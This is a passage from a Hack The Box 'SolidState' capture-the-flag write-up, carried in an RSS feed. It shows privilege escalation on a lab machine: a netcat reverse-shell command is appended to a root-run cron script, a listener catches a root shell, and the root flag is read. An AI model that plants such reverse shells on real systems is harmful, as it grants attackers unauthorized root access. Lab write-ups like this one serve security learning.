<p>Great, so the files in <code>/tmp</code> are being deleted. Let’s add a little bit of code to execute at the end of <code>tmp.py</code></p>
<p><a name="privilege-escalation" href="https://0x00sec.org"></a></p>
<h2>Phase 3 - Privilege Escalation</h2>
<pre><code class="lang-bash">mindy@solidstate:/tmp$ cd /opt
mindy@solidstate:/opt$ echo "os.system('/bin/nc -e /bin/bash 10.10.15.82 8001')" &gt;&gt; tmp.py
mindy@solidstate:/opt$ cat tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

os.system('/bin/nc -e /bin/bash 10.10.15.82 8001')
</code></pre>
<p>Now, we wait for our shell.</p>
<pre><code class="lang-bash">➜  ~ nc -vlnp 8001 
listening on [any] 8001 ...
connect to [10.10.15.82] from (UNKNOWN) [10.10.10.51] 45182
id
uid=0(root) gid=0(root) groups=0(root)  &lt;-- bask in the glory of shell!
cd /root
ls
root.txt
cat root.txt
b4c9723a28899b1c45db281d99cc87c9
</code></pre>
<p>Let’s also see what the cron was that ran this with our fancy new root privileges.</p>
<pre><code class="lang-bash">crontab -l
---trimmed due to size---
*/3 * * * * python /opt/tmp.py
</code></pre>
<p>Well, this box was way easier than one would have thought. We saved time by properly reading through the public exploit from <code>exploit-db</code>. All in all, this was a fun box.</p>
<p>Hope you enjoyed reading, happy hacking.</p>
          <p><a href="https://0x00sec.org/t/htb-solidstate-write-up/5129/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/htb-solidstate-write-up/5129/1</link>
        <pubDate>Sat, 27 Jan 2018 15:10:55 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-5129-1</guid>
        <source url="https://0x00sec.org/t/htb-solidstate-write-up/5129.rss">HTB SolidState write-up</source>
      </item>
  </channel>
</rss>
